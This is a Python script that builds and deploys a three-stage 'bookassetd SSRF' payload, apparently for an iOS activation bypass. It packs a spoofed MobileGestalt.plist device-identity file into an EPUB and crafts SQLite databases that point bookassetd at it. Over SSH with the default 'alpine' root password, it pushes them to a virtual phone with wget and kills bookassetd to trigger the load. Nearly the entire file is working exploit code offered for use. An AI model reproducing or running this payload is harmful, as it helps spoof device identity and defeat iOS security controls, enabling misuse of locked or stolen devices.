#!/usr/bin/env python3
"""
build_bookassetd_payload.py — Real 3-stage bookassetd SSRF payload builder

Based on RustA12-bypass get2.php logic, builds:
  Stage 1: EPUB (ZIP) containing com.apple.MobileGestalt.plist (iPhone12,5)
  Stage 2: BLDatabaseManager.sqlite with EPUB URL → served as belliloveu.png
  Stage 3: downloads.28.sqlitedb with Stage2 URL + bookassetd SystemGroup GUID

bookassetd SystemGroup GUID from live enumeration:
  F96DE1F4-B5AD-45DA-9399-7D1A7376D96B
"""
import sqlite3
import zipfile
import shutil
import os
import json
import subprocess
import time

# ─── CONFIGURATION ──────────────────────────────────────────────────────────
BOOKASSETD_GUID  = "F96DE1F4-B5AD-45DA-9399-7D1A7376D96B"
MAC_HTTP_IP      = "192.168.64.1"
MAC_HTTP_PORT    = 8888
SERVE_DIR        = "/tmp/mitm_serve"
VPHONE_SSH       = "sshpass -p alpine ssh -o StrictHostKeyChecking=no -p 22222 root@192.168.64.2"

PLIST_SRC        = "/Users/hades/Desktop/SecuritySentinel/RustA12-bypass/server/public/Maker/iPhone12-5/com.apple.MobileGestalt.plist"
BL_TEMPLATE      = "/Users/hades/Desktop/SecuritySentinel/RustA12-bypass/server/public/BLDatabaseManager.png"
DL_TEMPLATE      = "/Users/hades/Desktop/SecuritySentinel/RustA12-bypass/server/public/downloads.28.png"

OUT_DIR          = "/tmp/rusta12_payload"
os.makedirs(OUT_DIR, exist_ok=True)
os.makedirs(SERVE_DIR, exist_ok=True)

# ─── STAGE 1: Build EPUB (ZIP) with MobileGestalt.plist ─────────────────────
def build_stage1_epub():
    epub_path = f"{OUT_DIR}/fixedfile.epub"
    with zipfile.ZipFile(epub_path, 'w') as zf:
        # mimetype MUST be first and uncompressed (EPUB spec)
        zf.writestr(zipfile.ZipInfo("Caches/mimetype"), "application/epub+zip",
                    compress_type=zipfile.ZIP_STORED)
        zf.write(PLIST_SRC, "Caches/com.apple.MobileGestalt.plist",
                 compress_type=zipfile.ZIP_DEFLATED)
    shutil.copy(epub_path, f"{SERVE_DIR}/fixedfile.epub")
    url = f"http://{MAC_HTTP_IP}:{MAC_HTTP_PORT}/fixedfile.epub"
    print(f"  [S1] EPUB:      {url}  ({os.path.getsize(epub_path)} bytes)")
    return url

# ─── STAGE 2: Build BLDatabaseManager SQLite from template ───────────────────
def build_stage2_bldatabase(epub_url: str):
    with open(BL_TEMPLATE, 'r', encoding='utf-8', errors='replace') as f:
        sql_dump = f.read()
    sql_dump = sql_dump.replace('KEYOOOOOO', epub_url)
    
    db_path = f"{OUT_DIR}/BLDatabaseManager.sqlite"
    if os.path.exists(db_path):
        os.remove(db_path)
    
    conn = sqlite3.connect(db_path)
    # Execute the SQL dump statement by statement
    for stmt in sql_dump.split(';'):
        stmt = stmt.strip()
        if stmt and len(stmt) > 3:
            try:
                conn.execute(stmt + ';')
            except Exception as e:
                pass  # Some statements may have unistr() which we skip
    conn.commit()
    conn.close()
    
    # Rename to .png to match expected server filename
    png_path = f"{SERVE_DIR}/belliloveu.png"
    shutil.copy(db_path, png_path)
    url = f"http://{MAC_HTTP_IP}:{MAC_HTTP_PORT}/belliloveu.png"
    print(f"  [S2] BLDbMgr:  {url}  ({os.path.getsize(png_path)} bytes)")
    return url

# ─── STAGE 3: Build downloads.28.sqlitedb with real GUID ─────────────────────
def build_stage3_downloads(bl_url: str, guid: str):
    with open(DL_TEMPLATE, 'r', encoding='utf-8', errors='replace') as f:
        sql_dump = f.read()
    sql_dump = sql_dump.replace('https://google.com', bl_url)
    sql_dump = sql_dump.replace('GOODKEY', guid)
    
    db_path = f"{OUT_DIR}/downloads.28.sqlitedb"
    if os.path.exists(db_path):
        os.remove(db_path)
    
    conn = sqlite3.connect(db_path)
    for stmt in sql_dump.split(';'):
        stmt = stmt.strip()
        if stmt and len(stmt) > 3:
            try:
                conn.execute(stmt + ';')
            except Exception as e:
                pass
    conn.commit()
    conn.close()
    
    shutil.copy(db_path, f"{SERVE_DIR}/downloads.28.sqlitedb")
    print(f"  [S3] downloads: {os.path.getsize(db_path)} bytes  (GUID={guid[:8]}...)")
    return db_path

# ─── DEPLOY TO VPHONE ────────────────────────────────────────────────────────
def deploy_to_vphone(db_path: str):
    print(f"\n  [DEPLOY] Pushing downloads.28.sqlitedb to VPhone...")
    targets = [
        "/var/mobile/Media/Downloads/downloads.28.sqlitedb",
        "/var/mobile/Media/Books/downloads.28.sqlitedb",
    ]
    for target in targets:
        r = subprocess.run(
            f'{VPHONE_SSH} "/iosbinpack64/usr/local/bin/wget -q http://{MAC_HTTP_IP}:{MAC_HTTP_PORT}/downloads.28.sqlitedb -O {target} 2>&1; echo deploy:$?"',
            shell=True, capture_output=True, text=True, timeout=20
        )
        print(f"    {target}: {r.stdout.strip()}")
    
    print(f"  [TRIGGER] Killing bookassetd to force db reload...")
    subprocess.run(
        f'{VPHONE_SSH} "/var/jb/usr/bin/kill -9 $(/iosbinpack64/bin/ps aux 2>/dev/null | /var/jb/usr/bin/awk \'/bookasset[d]/{{print $2}}\' 2>/dev/null) 2>/dev/null; echo killed"',
        shell=True, capture_output=True, text=True, timeout=10
    )

# ─── MAIN ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║  RustA12-bypass: real 3-stage bookassetd payload builder       ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"  bookassetd GUID: {BOOKASSETD_GUID}")
    print()
    
    print("[Stage 1] Building EPUB with iPhone12,5 MobileGestalt.plist...")
    epub_url = build_stage1_epub()
    
    print("[Stage 2] Building BLDatabaseManager SQLite...")
    bl_url = build_stage2_bldatabase(epub_url)
    
    print("[Stage 3] Building downloads.28.sqlitedb with real GUID...")
    db_path = build_stage3_downloads(bl_url, BOOKASSETD_GUID)
    
    print()
    print("[Deploy ] Pushing payload to VPhone...")
    deploy_to_vphone(db_path)
    
    print()
    print("✓ Done. Monitor HTTP server log for bookassetd fetching belliloveu.png:")
    print(f"  tail -f /tmp/cert_server.log | grep -E 'belliloveu|fixedfile'")
    print()
    print("If bookassetd fetches these URLs → SSRF confirmed, MobileGestalt")
    print("spoof will be loaded by itunesstored from the EPUB")
